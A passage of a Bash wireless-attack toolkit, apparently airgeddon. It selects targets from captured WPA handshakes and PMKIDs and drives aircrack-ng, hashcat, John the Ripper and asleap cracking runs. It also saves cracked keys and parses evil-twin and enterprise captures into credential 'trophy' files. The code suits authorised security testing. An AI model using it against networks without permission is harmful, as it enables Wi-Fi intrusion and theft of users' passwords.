			language_strings "${language}" 323 "red"
			language_strings "${language}" 115 "read"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 323 "red"
			language_strings "${language}" 115 "read"
		fi
		return 1
	fi
}

#Set the target vars to a bssid selecting them from a capture file which has a Handshake/PMKID
function select_wpa_bssid_target_from_captured_file() {

	debug_print

	get_aircrack_version

	if compare_floats_greater_than "${aircrack_pmkid_version}" "${aircrack_version}"; then
		echo
		language_strings "${language}" 667 "yellow"
		language_strings "${language}" 115 "read"
	fi

	local nets_from_file
	if [ "${2}" = "only_handshake" ]; then
		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
	else
		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
	fi

	echo
	if [ "${nets_from_file}" = "" ]; then
		language_strings "${language}" 216 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 192 "blue"
			ask_yesno 193 "yes"

			if [ "${yesno}" = "y" ]; then
				bssid=${targetbssid}
				return 0
			fi
			break
		fi
	done

	bssid_autoselected=0
	if [ "${option_counter}" -gt 1 ]; then
		option_counter=0
		for item in ${nets_from_file}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then

				option_counter=$((option_counter + 1))

				if [ "${option_counter}" -lt 10 ]; then
					space=" "
				else
					space=""
				fi

				echo -n "${option_counter}.${space}${item}"
			elif [[ ${item} =~ \)$ ]]; then
				echo -en "${item}\r\n"
			else
				echo -en " ${item} "
			fi
		done
		print_hint ${current_menu}

		target_network_on_file=0
		while [[ ! ${target_network_on_file} =~ ^[[:digit:]]+$ ]] || ((target_network_on_file < 1 || target_network_on_file > option_counter)); do
			echo
			language_strings "${language}" 3 "green"
			read -rp "> " target_network_on_file
		done

	else
		target_network_on_file=1
		bssid_autoselected=1
	fi

	bssid=${bssids_detected[${target_network_on_file}]}

	if [ "${bssid_autoselected}" -eq 1 ]; then
		language_strings "${language}" 217 "blue"
	fi

	return 0
}

#Validate if given file has a valid enterprise john the ripper format
function validate_enterprise_jtr_file() {

	debug_print

	echo
	readarray -t JTR_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${JTR_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^.+:\$NETNTLM\$[[:xdigit:]\$]+$ ]]; then
			language_strings "${language}" 607 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 608 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate if given file has a valid pmkid hashcat format
function validate_pmkid_hashcat_file() {

	debug_print

	echo
	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^WPA\*[0-9]{2}\*[0-9a-fA-F]{32}\*([0-9a-fA-F]{12}\*){2}[0-9a-fA-F]{18,32}\*+.*$ ]]; then
			language_strings "${language}" 676 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 675 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate if given file has a valid enterprise hashcat format
function validate_enterprise_hashcat_file() {

	debug_print

	echo
	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^(.+)::::(.+):(.+)$ ]]; then
			language_strings "${language}" 601 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 602 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate and ask for the different parameters used in an enterprise asleap dictionary based attack
function enterprise_asleap_dictionary_attack_option() {

	debug_print

	manage_asking_for_challenge_response
	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"

	echo
	exec_asleap_attack "offline_menu"
	echo
	manage_asleap_pot "offline_menu"
}

#Validate and ask for the different parameters used in an aircrack dictionary based attack
function aircrack_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "personal_handshake" "aircrack"

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_dictionary_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in an aircrack bruteforce based attack
function aircrack_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "personal_handshake" "aircrack"

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
		return
	fi

	set_minlength_and_maxlength "personal_handshake"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || ((charset_option < 1 || charset_option > 11)); do
		set_charset "aircrack"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_bruteforce_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in a john the ripper dictionary based attack
function enterprise_jtr_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "enterprise" "jtr"

	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_jtr_dictionary_attack
	manage_jtr_pot
}

#Validate and ask for the different parameters used in a john the ripper bruteforce based attack
function enterprise_jtr_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "enterprise" "jtr"

	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
		return
	fi

	set_minlength_and_maxlength "enterprise"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || ((charset_option < 1 || charset_option > 11)); do
		set_charset "jtr"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_jtr_bruteforce_attack
	manage_jtr_pot
}

#Validate and ask for the different parameters used in a hashcat dictionary based attack
function hashcat_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_dictionary_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Validate and ask for the different parameters used in a hashcat bruteforce based attack
function hashcat_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	set_minlength_and_maxlength "${1}"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || ((charset_option < 1 || charset_option > 11)); do
		set_charset "hashcat"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_bruteforce_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Validate and ask for the different parameters used in a hashcat rule based attack
function hashcat_rulebased_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	manage_asking_for_dictionary_file
	manage_asking_for_rule_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_rulebased_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Check if the password was decrypted using hashcat and manage to save it on a file
function manage_hashcat_pot() {

	debug_print

	hashcat_output=$(cat "${tmpdir}${hashcat_output_file}")

	pass_decrypted_by_hashcat=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then
		local regexp="Status\.+:[[:space:]]Cracked"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		else
			if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
				if [ -f "${tmpdir}${hashcat_pot_tmp}" ]; then
					pass_decrypted_by_hashcat=1
				fi
			fi
		fi
	else
		local regexp="All hashes have been recovered"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		fi
	fi

	if [ "${pass_decrypted_by_hashcat}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			hashcat_potpath="${default_save_path}"

			local multiple_users=0
			if [ "${1}" = "personal_handshake" ]; then
				hashcatpot_filename="hashcat-${bssid}.txt"
				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
			elif [ "${1}" = "personal_pmkid" ]; then
				hashcatpot_filename="hashcat-pmkid.txt"
				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
			else
				if [[ $(wc -l "${tmpdir}${hashcat_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
					multiple_users=1
					hashcatpot_filename="hashcat-enterprise_user-multiple_users.txt"
					local enterprise_users=()
					local hashcat_keys=()
					readarray -t DECRYPTED_MULTIPLE_USER_PASS < <(uniq "${tmpdir}${hashcat_pot_tmp}" | sort 2> /dev/null)
					for item in "${DECRYPTED_MULTIPLE_USER_PASS[@]}"; do
						[[ "${item}" =~ ^([^:]+:?[^:]+) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
						[[ "${item}" =~ .+:(.+)$ ]] && hashcat_keys+=("${BASH_REMATCH[1]}")
					done
				else
					local enterprise_user
					[[ $(cat "${hashcatenterpriseenteredpath}") =~ ^([^:]+:?[^:]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
					hashcatpot_filename="hashcat-enterprise_user-${enterprise_user}.txt"
					[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
				fi
			fi
			hashcat_potpath="${hashcat_potpath}${hashcatpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "hashcatpot"
			done

			{
			echo ""
			date +%Y-%m-%d
			echo "${hashcat_texts[${language},1]}"
			echo ""
			} >> "${potenteredpath}"

			if [ "${1}" = "personal_handshake" ]; then
				{
				echo "BSSID: ${bssid}"
				} >> "${potenteredpath}"
			elif [ "${1}" = "personal_pmkid" ]; then
				{
				echo "${hashcat_texts[${language},0]}:"
				} >> "${potenteredpath}"
			elif [ "${1}" = "enterprise" ]; then
				if [ "${multiple_users}" -eq 1 ]; then
					{
					echo "${hashcat_texts[${language},3]}:"
					} >> "${potenteredpath}"
				else
					{
					echo "${hashcat_texts[${language},2]}: ${enterprise_user}"
					} >> "${potenteredpath}"
				fi
			fi

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo ""
				echo "---------------"
				echo ""
				} >> "${potenteredpath}"

				for ((x=0; x<${#enterprise_users[@]}; x++)); do
					{
					echo "${enterprise_users[${x}]} / ${hashcat_keys[${x}]}"
					} >> "${potenteredpath}"
				done
			else
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${hashcat_key}"
				} >> "${potenteredpath}"
			fi

			add_contributing_footer_to_file "${potenteredpath}"

			echo
			language_strings "${language}" 236 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using john the ripper and manage to save it on a file
function manage_jtr_pot() {

	debug_print

	jtr_pot=$(cat "${tmpdir}${jtr_pot_tmp}")

	pass_decrypted_by_jtr=0

	if [[ ${jtr_pot} =~ ^\$NETNTLM\$[^:]+:.+$ ]]; then
		pass_decrypted_by_jtr=1
	fi

	if [ "${pass_decrypted_by_jtr}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			jtr_potpath="${default_save_path}"

			local multiple_users=0

			if [[ $(wc -l "${tmpdir}${jtr_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
				multiple_users=1
				jtrpot_filename="jtr-enterprise_user-multiple_users.txt"
				local enterprise_users=()
				local jtr_keys=()
				readarray -t DECRYPTED_MULTIPLE_PASS < <(uniq "${tmpdir}${jtr_pot_tmp}" | sort 2> /dev/null)
				for item in "${DECRYPTED_MULTIPLE_PASS[@]}"; do
					[[ "${item}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_keys+=("${BASH_REMATCH[1]}")
					[[ $(grep -E "^${BASH_REMATCH[1]}" "${tmpdir}${jtr_output_file}") =~ ^"${BASH_REMATCH[1]}"[[:blank:]]+\((.+)\) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
				done
			else
				local enterprise_user
				[[ $(cat "${jtrenterpriseenteredpath}") =~ ^([^:\$]+:?[^:\$]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
				jtrpot_filename="jtr-enterprise_user-${enterprise_user}.txt"
				[[ "${jtr_pot}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_key="${BASH_REMATCH[1]}"
			fi
			jtr_potpath="${jtr_potpath}${jtrpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "jtrpot"
			done

			{
			echo ""
			date +%Y-%m-%d
			echo "${jtr_texts[${language},1]}"
			echo ""
			} >> "${jtrpotenteredpath}"

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo "${jtr_texts[${language},0]}"
				} >> "${jtrpotenteredpath}"
			else
				{
				echo "${jtr_texts[${language},2]}: ${enterprise_user}"
				} >> "${jtrpotenteredpath}"
			fi

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo ""
				echo "---------------"
				echo ""
				} >> "${jtrpotenteredpath}"

				for ((x=0; x<${#enterprise_users[@]}; x++)); do
					{
					echo "${enterprise_users[${x}]} / ${jtr_keys[${x}]}"
					} >> "${jtrpotenteredpath}"
				done
			else
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${jtr_key}"
				} >> "${jtrpotenteredpath}"
			fi

			add_contributing_footer_to_file "${jtrpotenteredpath}"

			echo
			language_strings "${language}" 547 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using aircrack and manage to save it on a file
function manage_aircrack_pot() {

	debug_print

	pass_decrypted_by_aircrack=0
	if [ -f "${tmpdir}${aircrack_pot_tmp}" ]; then
		pass_decrypted_by_aircrack=1
	fi

	if [ "${pass_decrypted_by_aircrack}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			aircrack_potpath="${default_save_path}"
			aircrackpot_filename="aircrack-${bssid}.txt"
			aircrack_potpath="${aircrack_potpath}${aircrackpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "aircrackpot"
			done

			aircrack_key=$(cat "${tmpdir}${aircrack_pot_tmp}")
			{
			echo ""
			date +%Y-%m-%d
			echo "${aircrack_texts[${language},0]}"
			echo ""
			echo "BSSID: ${bssid}"
			echo ""
			echo "---------------"
			echo ""
			echo "${aircrack_key}"
			} >> "${aircrackpotenteredpath}"

			add_contributing_footer_to_file "${aircrackpotenteredpath}"

			echo
			language_strings "${language}" 440 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using asleap against challenges and responses
function manage_asleap_pot() {

	debug_print

	asleap_output=$(cat "${tmpdir}${asleap_pot_tmp}")

	if [[ "${asleap_output}" =~ password:[[:blank:]]+(.*) ]]; then

		local asleap_decrypted_password="${BASH_REMATCH[1]}"
		local write_to_file=0

		language_strings "${language}" 234 "yellow"

		if [ "${1}" != "offline_menu" ]; then
			echo
			local write_to_file=1
			asleap_attack_finished=1
			path_to_asleap_trophy="${enterprise_completepath}enterprise_asleap_decrypted_${bssid}_password.txt"
		else
			ask_yesno 235 "yes"
			if [ "${yesno}" = "y" ]; then
				local write_to_file=1
				asleap_potpath="${default_save_path}"
				asleappot_filename="asleap_decrypted_password.txt"
				asleap_potpath="${asleap_potpath}${asleappot_filename}"

				validpath=1
				while [[ "${validpath}" != "0" ]]; do
					read_path "asleappot"
				done

				path_to_asleap_trophy="${asleapenteredpath}"
			fi
		fi

		if [ "${write_to_file}" = "1" ]; then
			rm -rf "${path_to_asleap_trophy}" > /dev/null 2>&1

			{
			echo ""
			date +%Y-%m-%d
			echo "${asleap_texts[${language},1]}"
			echo ""
			} >> "${path_to_asleap_trophy}"

			if [ "${1}" != "offline_menu" ]; then
				{
				echo "ESSID: ${essid}"
				echo "BSSID: ${bssid}"
				} >> "${path_to_asleap_trophy}"
			fi

			{
			echo "${asleap_texts[${language},2]}: ${enterprise_asleap_challenge}"
			echo "${asleap_texts[${language},0]}: ${enterprise_asleap_response}"
			echo ""
			echo "---------------"
			echo ""
			} >> "${path_to_asleap_trophy}"

			if [ "${1}" != "offline_menu" ]; then
				{
				echo "${enterprise_username} / ${asleap_decrypted_password}"
				} >> "${path_to_asleap_trophy}"
			else
				{
				echo "${asleap_decrypted_password}"
				} >> "${path_to_asleap_trophy}"
			fi

			add_contributing_footer_to_file "${path_to_asleap_trophy}"

			language_strings "${language}" 539 "blue"
			language_strings "${language}" 115 "read"
		fi
	else
		if [ "${1}" != "offline_menu" ]; then
			language_strings "${language}" 540 "red"

			ask_yesno 541 "no"
			if [ "${yesno}" = "n" ]; then
				asleap_attack_finished=1
			fi
		else
			language_strings "${language}" 540 "red"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the wep besside password was captured and manage to save it on a file
function manage_wep_besside_pot() {

	debug_print

	local wep_besside_pass_cracked=0
	if grep -q "Got key" "${tmpdir}${wep_besside_log}" 2> /dev/null; then
		sed -ri '1,/Got key/{/Got key/!d; s/.*(Got key)/\1/}' "${tmpdir}${wep_besside_log}" 2> /dev/null
		readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wep_besside_log}" 2> /dev/null)
		for item in "${LINES_TO_PARSE[@]}"; do
			if [[ "${item}" =~ Got[[:blank:]]key[[:blank:]]for.*\[([0-9A-F:]+)\].*IVs ]]; then
				wep_hex_key="${BASH_REMATCH[1]}"
				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
				wep_besside_pass_cracked=1
				break
			fi
		done
	fi

	if [ "${wep_besside_pass_cracked}" -eq 1 ]; then
		echo "" > "${weppotenteredpath}"
		{
		date +%Y-%m-%d
		echo -e "${wep_texts[${language},1]}"
		echo ""
		echo -e "BSSID: ${bssid}"
		echo -e "${wep_texts[${language},2]}: ${channel}"
		echo -e "ESSID: ${essid}"
		echo ""
		echo "---------------"
		echo ""
		echo -e "ASCII: ${wep_ascii_key}"
		echo -en "${wep_texts[${language},3]}:"
		echo -en " ${wep_hex_key}"
		echo ""
		echo ""
		echo "---------------"
		echo ""
		echo "${footer_texts[${language},0]}"
		} >> "${weppotenteredpath}"

		echo
		language_strings "${language}" 162 "yellow"
		echo
		language_strings "${language}" 724 "blue"
		language_strings "${language}" 115 "read"
	fi
}

#Check if the passwords were captured using ettercap and manage to save them on a file
function manage_ettercap_log() {

	debug_print

	ettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		ettercap_log=1
		default_ettercap_logpath="${default_save_path}"
		default_ettercaplogfilename="evil_twin_captured_passwords-${essid}.txt"
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		tmp_ettercaplog="${tmpdir}${ettercap_file}"
		default_ettercap_logpath="${default_ettercap_logpath}${default_ettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ettercaplog"
		done
	fi
}

#Check if the passwords were captured using bettercap and manage to save them on a file
function manage_bettercap_log() {

	debug_print

	bettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		bettercap_log=1
		default_bettercap_logpath="${default_save_path}"
		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
		tmp_bettercaplog="${tmpdir}${bettercap_file}"
		default_bettercap_logpath="${default_bettercap_logpath}${default_bettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "bettercaplog"
		done
	fi
}

#Check if the passwords were captured using wps attacks and manage to save them on a file
function manage_wps_log() {

	debug_print

	wps_potpath="${default_save_path}"

	if [ -z "${wps_essid}" ]; then
		wpspot_filename="wps_captured_key-${wps_bssid}.txt"
	else
		wpspot_filename="wps_captured_key-${wps_essid}.txt"
	fi
	wps_potpath="${wps_potpath}${wpspot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "wpspot"
	done
}

#Check if the password was captured using wep all-in-one or besside-ng attack and manage to save it on a file
function manage_wep_log() {

	debug_print

	wep_potpath="${default_save_path}"
	weppot_filename="wep_captured_key-${essid}.txt"
	wep_potpath="${wep_potpath}${weppot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "weppot"
	done
}

#Check if a hash or a password was captured using Evil Twin Enterprise attack and manage to save it on a directory
function manage_enterprise_log() {

	debug_print

	enterprise_potpath="${default_save_path}"
	enterprisepot_suggested_dirname="enterprise_captured-${essid}"
	enterprise_potpath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "enterprisepot"
	done
}

#Check to save certs for Evil Twin Enterprise attack
function manage_enterprise_certs() {

	debug_print

	enterprisecertspath="${default_save_path}"
	enterprisecerts_suggested_dirname="enterprise_certs"
	enterprisecertspath="${enterprisecertspath}${enterprisecerts_suggested_dirname}/"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "certificates"
	done
}

#Save created cert files to user's location
function save_enterprise_certs() {

	debug_print

	if [ ! -d "${enterprisecerts_completepath}" ]; then
		mkdir -p "${enterprisecerts_completepath}" > /dev/null 2>&1
	fi

	cp "${tmpdir}${certsdir}server.pem" "${enterprisecerts_completepath}" 2> /dev/null
	cp "${tmpdir}${certsdir}ca.pem" "${enterprisecerts_completepath}" 2> /dev/null
	cp "${tmpdir}${certsdir}server.key" "${enterprisecerts_completepath}" 2> /dev/null

	echo
	language_strings "${language}" 644 "blue"
	language_strings "${language}" 115 "read"
}

#Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
function manage_captive_portal_log() {

	debug_print

	default_et_captive_portal_logpath="${default_save_path}"
	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
	default_et_captive_portal_logpath="${default_et_captive_portal_logpath}${default_et_captive_portallogfilename}"
	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "et_captive_portallog"
	done
}

#Handle enterprise log captures
function handle_enterprise_log() {

	debug_print

	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then

		enterprise_attack_result_code=$(cat < "${tmpdir}${enterprisedir}${enterprise_successfile}" 2> /dev/null)
		echo
		if [ "${enterprise_attack_result_code}" -eq 0 ]; then
			language_strings "${language}" 530 "yellow"
			parse_from_enterprise "hashes"
		elif [ "${enterprise_attack_result_code}" -eq 1 ]; then
			language_strings "${language}" 531 "yellow"
			parse_from_enterprise "passwords"
		elif [ "${enterprise_attack_result_code}" -eq 2 ]; then
			language_strings "${language}" 532 "yellow"
			parse_from_enterprise "both"
		fi

		echo
		language_strings "${language}" 533 "blue"
		language_strings "${language}" 115 "read"
	else
		echo
		language_strings "${language}" 529 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Parse enterprise log to create trophy files
function parse_from_enterprise() {

	debug_print

	local line_number
	local username
	local john_hashes=()
	local hashcat_hashes=()
	local passwords=()
	local line_to_check
	local text_to_check
	unset enterprise_captured_challenges_responses
	declare -gA enterprise_captured_challenges_responses

	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,3 | uniq --skip-fields=1 2> /dev/null)
	for item in "${CAPTURED_USERNAMES[@]}"; do
		[[ "${item}" =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
		line_to_check=$((line_number + 1))
		text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)

		if [[ "${text_to_check}" =~ challenge:[[:blank:]]+(.*) ]]; then
			enterprise_captured_challenges_responses["${username}"]="${BASH_REMATCH[1]}"
			line_to_check=$((line_number + 2))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ response:[[:blank:]]+(.*) ]] && enterprise_captured_challenges_responses["${username}"]+=" / ${BASH_REMATCH[1]}"

			line_to_check=$((line_number + 3))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ jtr[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && john_hashes+=("${BASH_REMATCH[1]}")

			line_to_check=$((line_number + 4))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ hashcat[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && hashcat_hashes+=("${BASH_REMATCH[1]}")
		fi

		if [[ "${text_to_check}" =~ password:[[:blank:]]+(.*) ]]; then
			passwords+=("${username} / ${BASH_REMATCH[1]}")
		fi
	done

	prepare_enterprise_trophy_dir

	case ${1} in
		"hashes")
			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
			write_enterprise_hashes_file "john" "${john_hashes[@]}"
		;;
		"passwords")
			write_enterprise_passwords_file "${passwords[@]}"
		;;
		"both")
			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
			write_enterprise_hashes_file "john" "${john_hashes[@]}"
			write_enterprise_passwords_file "${passwords[@]}"
		;;
	esac

	enterprise_username="${username}"
}

#Prepare dir for enterprise trophy files
function prepare_enterprise_trophy_dir() {

	debug_print

	if [ ! -d "${enterprise_completepath}" ]; then
		mkdir -p "${enterprise_completepath}" > /dev/null 2>&1
	fi
}

#Write enterprise captured hashes to trophy file
function write_enterprise_hashes_file() {

	debug_print

	local values=("${@:2}")
	rm -rf "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt" > /dev/null 2>&1

	for item in "${values[@]}"; do
		{
		echo "${item}"
		} >> "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt"
	done
}

#Write enterprise captured passwords to trophy file
function write_enterprise_passwords_file() {

	debug_print

	local values=("${@:1}")
	rm -rf "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt" > /dev/null 2>&1

	{
	echo ""
	date +%Y-%m-%d
	echo "${enterprise_texts[${language},11]}"
	echo ""
	echo "ESSID: ${essid}"
	echo "BSSID: ${bssid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"

	for item in "${values[@]}"; do
		{
		echo "${item}"
		} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
	done

	add_contributing_footer_to_file "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
}

#Captive portal language menu
function set_captive_portal_language() {

	debug_print

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
